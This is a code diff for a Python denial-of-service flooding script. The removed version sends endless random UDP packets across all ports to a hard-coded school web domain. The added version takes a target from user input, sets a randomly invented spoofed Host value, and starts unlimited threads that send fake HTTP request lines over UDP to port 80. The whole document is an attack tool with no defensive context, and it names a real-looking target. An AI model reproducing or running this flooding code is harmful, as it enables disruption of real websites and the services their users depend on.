@@ -1,37 +1,46 @@
-import sys
-import os
-import time
-import socket
-import random
-#Code Time
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+import socket, random, time
+import threading
+ 
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+ 
+def get_ip(link):
+    return socket.gethostbyname(link)
 
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
+def get_port():
+    return 80 
 
-def get_ip_and_port(hostname, port):
-    try:
-        ip_address = socket.gethostbyname(hostname)
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ip_address, port))
-        return (ip_address, port)
-    except socket.gaierror:
-        return "Unable to resolve hostname"
+link = input("Enter link: ")
+print("Link: ", link)
+ip = get_ip(link)
+port = get_port()
+ 
+print("IP: ", ip)
+print("Port: ", port)
 
-ip , port = get_ip_and_port("c3khanhlam.camau.edu.vn", 80)
-sent = 0
+fake_ip = ""
+for i in range(4):
+    fake_ip += str(random.randint(0, 255)) + "."
+fake_ip = fake_ip[:-1]
+ 
+print("Fake IP: ", fake_ip)
+
+time.sleep(5)
+
+already_connected = 0
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect((ip, port))
+        s.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
+        s.close()
+        
+        global already_connected  
+        already_connected += 1
+        if already_connected % 500 == 0:
+            print("Already connected: ", already_connected)
+        
 while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print( "Sent %s packet to %s throught port:%s"%(sent,ip,port))
-     if port == 65534:
-       port = 1
+    thread = threading.Thread(target=attack)
+    thread.start()
